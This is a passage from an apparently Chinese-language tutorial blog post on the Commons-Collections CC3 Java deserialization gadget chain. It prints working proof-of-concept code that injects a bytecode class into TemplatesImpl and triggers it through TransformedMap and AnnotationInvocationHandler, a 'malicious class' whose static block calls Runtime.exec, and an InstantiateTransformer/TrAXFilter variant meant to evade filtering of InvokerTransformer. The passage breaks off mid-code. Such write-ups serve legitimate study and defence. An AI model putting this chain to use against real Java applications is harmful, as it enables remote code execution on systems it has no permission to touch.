<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">POC</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransformerConfigurationException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span> <span class="token punctuation">&#123;</span>
     <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token class-name">Class</span> clazz <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token class-name">Field</span> names <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     names<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     names<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token class-name">Field</span> bytecodes <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     bytecodes<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> test1 <span class="token operator">=</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:\\javaDeserialization\\ysoserial-master\\target\\test-classes\\ysoserial\\MyCC3\\Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> <span class="token punctuation">&#123;</span>test1<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
     bytecodes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> codes<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token class-name">Field</span> tfactory <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     tfactory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     tfactory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//     templates.newTransformer();</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> map1 <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Constructor</span> ctor <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ctor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> o <span class="token operator">=</span> ctor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>map1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//        serialize(o);</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"MyPOC3.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"MyPOC3.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> file<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>恶意类：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span></span><span class="token class-name">MyCC3</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Calc</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>

    <span class="token punctuation">&#125;</span>
    
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里的恶意类需要继承AbstractTrabslet类的原因是</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721183717995-b096bb66-b8fa-417c-b42d-3425c23c6894.png"></p>
<p>在这段代码中，会检测我们加载的恶意类的父类是不是这个常量，然后这个常量又是AbstractTrabslet这个类</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/44011315/1721183814472-a0178494-6830-4780-83d0-e9ccc11c83c4.png"></p>
<p>所以我们的恶意类就需要继承这个类，才能使代码成功执行。</p>
<p>入口的那条链子与CC1和CC6差不多，我们只需要将InvokerTransformer类中反射调用Runtime改成反射调用TemplateIpl类中的newTransformer方法即可。</p>
<p>然后就是另一个版本的链子了</p>
<h3 id="InstantiateTransformer链"><a href="#InstantiateTransformer链" class="headerlink" title="InstantiateTransformer链"></a>InstantiateTransformer链</h3><p>当我们的InvokeTransformer被过滤时，我们就需要使用其他的类链调用，我们接下来的链子，InstantiateTransformer就是一个不错的选择，其中也存在transform方法</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721186498826-6dd55841-28df-4bad-adcb-f1da74778211.png"></p>
<p>逻辑是先判断传进来的参数是否为Class，如果是的化获取这个类的构造器，然后实例化构造函数，同时存在这样一个类TrAXFilter，调用了newTransformer</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721186938706-7ac768e8-6b47-46cd-a9ba-6b26c365027e.png"></p>
<p>所以我们的链子也就出来了，就只要将InvokerTransformer反射调用newTransformer改成用InstantiateTransformer调用TrAXFilter中的同名方法，来调用newTransformer即可。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span></span><span class="token class-name">MyCC3</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>velocity<span class="token punctuation">.</span></span><span class="token class-name">Template</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">TransformerConfigurationException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">POC</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransformerConfigurationException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span> <span class="token punctuation">&#123;</span>
     <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token class-name">Class</span> clazz <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token class-name">Field</span> names <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     names<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     names<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token class-name">Field</span> bytecodes <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     bytecodes<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> test1 <span class="token operator">=</span><span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:\\javaDeserialization\\ysoserial-master\\target\\test-classes\\ysoserial\\MyCC3\\Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> <span class="token punctuation">&#123;</span>test1<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
     bytecodes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> codes<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token class-name">Field</span> tfactory <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     tfactory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     tfactory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//     templates.newTransformer();</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token comment">//            new InvokerTransformer("newTransformer", null, null)</span>
            <span class="token keyword">new</span>  <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>templates<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token comment">//        InstantiateTransformer instantiateTransformer = new  InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;);</span>
<span class="token comment">//        instantiateTransformer.transform(TrAXFilter.class);</span>

        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> map1 <span class="token operator">=</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
